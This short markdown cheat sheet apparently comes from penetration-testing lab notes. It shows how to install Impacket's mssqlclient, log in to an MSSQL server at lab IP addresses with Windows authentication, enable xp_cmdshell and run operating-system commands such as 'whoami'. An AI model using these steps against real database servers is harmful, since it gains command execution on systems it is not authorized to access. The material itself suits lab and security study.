
### `mssqlclient`

```bash
# Download
https://github.com/fortra/impacket/releases

# Setup
## If need python evniorment
python3 -m venv venv
source venv/bin/activate
## package installing
pip install -r requirements.txt
python3 setup.py install 

# Connect
cd example
python3 mssqlclient.py -windows-auth sql_dev@10.129.11.72
Enter Password

# enable cmd shell
enable_xp_cmdshell
# run command 
xp_cmdshell whoami
```
###### OR

```bash
# install
python3 -m pipx install impacket

# verify
which mssqlclient.py

# run
mssqlclient.py -windows-auth sql_dev@10.129.43.43
Enter Password

# enable cmd shell
enable_xp_cmdshell
# run command 
xp_cmdshell whoami
```